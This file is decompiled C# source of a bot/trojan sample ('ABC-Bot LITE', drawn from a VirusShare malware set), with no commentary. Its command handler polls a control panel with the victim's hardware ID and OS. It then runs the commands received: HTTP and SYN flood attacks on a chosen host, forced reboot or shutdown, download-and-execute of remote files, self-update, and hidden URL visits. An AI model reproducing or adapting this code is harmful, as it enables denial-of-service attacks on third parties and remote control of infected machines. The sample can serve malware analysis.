// Decompiled with JetBrains decompiler
// Type: ABC_Bot.c_cmd
// Assembly: ABC-Bot LITE, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E9E554F4-9AFA-414B-A1D5-AE64E23AD16E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00013-msil\Trojan-Ransom.Win32.PornoAsset.davi-d3bafcbbb2aacb297f2bd46e205cfb6b97d90b2a88fecf80d25ec75555856328.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Threading;

namespace ABC_Bot
{
  public class c_cmd
  {
    [DebuggerNonUserCode]
    public c_cmd()
    {
    }

    public static object cmd()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        string lower = Conversions.ToString(mod_wrequest.request(main.panel, Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject((object) "action=cmd&hwid=", mod_hwid.hwid()), (object) "&os="), (object) mod_os.getOs()))));
label_2:
        num3 = 3;
        lower = lower.ToLower();
label_3:
        num3 = 4;
        string[] strArray = Strings.Split(lower, " -");
label_4:
        num3 = 5;
        if (!lower.StartsWith("http"))
          goto label_17;
label_5:
        num3 = 6;
        if (!main.http)
          goto label_58;
label_6:
        num3 = 7;
        c_http.Flooding = true;
label_7:
        num3 = 8;
        c_http.host = strArray[1];
label_8:
        num3 = 9;
        int num4 = Conversions.ToInteger(strArray[2]);
label_9:
        num3 = 10;
        if (num4 >= 1)
          goto label_11;
label_10:
        num3 = 11;
        num4 = 1;
label_11:
        num3 = 13;
        int num5 = num4;
        int index = 1;
        goto label_16;
label_12:
        num3 = 14;
        Thread[] threadArray = new Thread[checked (index + 1)];
label_13:
        num3 = 15;
        threadArray[index] = new Thread((ThreadStart) (() => c_http.http()));
label_14:
        num3 = 16;
        threadArray[index].Start();
label_15:
        num3 = 17;
        checked { ++index; }
label_16:
        if (index <= num5)
          goto label_12;
        else
          goto label_58;
label_17:
        num3 = 20;
        if (!lower.StartsWith("supersyn"))
          goto label_32;
label_18:
        num3 = 21;
        if (!main.supersyn)
          goto label_58;
label_19:
        num3 = 22;
        if (c_SuperSyn.IsEnabled)
          goto label_25;
label_20:
        num3 = 23;
        c_SuperSyn.Host = strArray[1];
label_21:
        num3 = 24;
        c_SuperSyn.Port = Conversions.ToInteger(strArray[2]);
label_22:
        num3 = 25;
        c_SuperSyn.Threads = Conversions.ToInteger(strArray[3]);
label_23:
        num3 = 26;
        c_SuperSyn.SuperSynSockets = Conversions.ToInteger(strArray[4]);
label_24:
        num3 = 27;
        c_SuperSyn.StartSuperSyn();
        goto label_58;
label_25:
        num3 = 29;
label_26:
        num3 = 30;
        c_SuperSyn.StopSuperSyn();
label_27:
        num3 = 31;
        c_SuperSyn.Host = strArray[1];
label_28:
        num3 = 32;
        c_SuperSyn.Port = Conversions.ToInteger(strArray[2]);
label_29:
        num3 = 33;
        c_SuperSyn.Threads = Conversions.ToInteger(strArray[3]);
label_30:
        num3 = 34;
        c_SuperSyn.SuperSynSockets = Conversions.ToInteger(strArray[4]);
label_31:
        num3 = 35;
        c_SuperSyn.StartSuperSyn();
        goto label_58;
label_32:
        num3 = 39;
        if (!lower.StartsWith("stopflood"))
          goto label_36;
label_33:
        num3 = 40;
        c_SuperSyn.StopSuperSyn();
label_34:
        num3 = 41;
        c_http.Flooding = false;
label_35:
        num3 = 42;
        c_http.host = "";
        goto label_58;
label_36:
        num3 = 44;
        if (!lower.StartsWith("reboot"))
          goto label_38;
label_37:
        num3 = 45;
        Interaction.Shell("SHUTDOWN -r -t 01");
        goto label_58;
label_38:
        num3 = 47;
        if (!lower.StartsWith("shutdown"))
          goto label_40;
label_39:
        num3 = 48;
        Interaction.Shell("SHUTDOWN -s -t 01");
        goto label_58;
label_40:
        num3 = 50;
        if (!lower.StartsWith("dlexec"))
          goto label_42;
label_41:
        num3 = 51;
        c_dlexec.dlexec(strArray[1]);
        goto label_58;
label_42:
        num3 = 53;
        if (!lower.StartsWith("update"))
          goto label_44;
label_43:
        num3 = 54;
        c_dlexec.update(strArray[1]);
        goto label_58;
label_44:
        num3 = 56;
        if (!lower.StartsWith("visit"))
          goto label_58;
label_45:
        num3 = 57;
        string str = strArray[1];
label_46:
        num3 = 58;
        if (str.StartsWith("http://"))
          goto label_48;
label_47:
        num3 = 59;
        str = "http://" + str;
label_48:
        num3 = 61;
        if (Operators.CompareString(strArray[2], "unhidden", false) != 0)
          goto label_50;
label_49:
        num3 = 62;
        Process.Start(str);
        goto label_58;
label_50:
        num3 = 64;
label_51:
        num3 = 65;
        mod_wrequest.request(str, strArray[3]);
        goto label_58;
label_53:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num6 = num2 + 1;
            num2 = 0;
            switch (num6)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
              case 13:
                goto label_11;
              case 14:
                goto label_12;
              case 15:
                goto label_13;
              case 16:
                goto label_14;
              case 17:
                goto label_15;
              case 18:
              case 19:
              case 28:
              case 36:
              case 37:
              case 38:
              case 43:
              case 46:
              case 49:
              case 52:
              case 55:
              case 63:
              case 66:
              case 67:
              case 68:
                goto label_58;
              case 20:
                goto label_17;
              case 21:
                goto label_18;
              case 22:
                goto label_19;
              case 23:
                goto label_20;
              case 24:
                goto label_21;
              case 25:
                goto label_22;
              case 26:
                goto label_23;
              case 27:
                goto label_24;
              case 29:
                goto label_25;
              case 30:
                goto label_26;
              case 31:
                goto label_27;
              case 32:
                goto label_28;
              case 33:
                goto label_29;
              case 34:
                goto label_30;
              case 35:
                goto label_31;
              case 39:
                goto label_32;
              case 40:
                goto label_33;
              case 41:
                goto label_34;
              case 42:
                goto label_35;
              case 44:
                goto label_36;
              case 45:
                goto label_37;
              case 47:
                goto label_38;
              case 48:
                goto label_39;
              case 50:
                goto label_40;
              case 51:
                goto label_41;
              case 53:
                goto label_42;
              case 54:
                goto label_43;
              case 56:
                goto label_44;
              case 57:
                goto label_45;
              case 58:
                goto label_46;
              case 59:
                goto label_47;
              case 60:
              case 61:
                goto label_48;
              case 62:
                goto label_49;
              case 64:
                goto label_50;
              case 65:
                goto label_51;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_53;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_58:
      object obj1;
      object obj2 = obj1;
      if (num2 == 0)
        return obj2;
      ProjectData.ClearProjectError();
      return obj2;
    }

    public static object intvall()
    {
      int intervall = main.intervall;
      int num = 1;
      while (num <= intervall)
      {
        if (num == checked (main.intervall - 1))
        {
          c_cmd.cmd();
          num = 1;
        }
        Thread.Sleep(1000);
        checked { ++num; }
      }
      object obj;
      return obj;
    }
  }
}
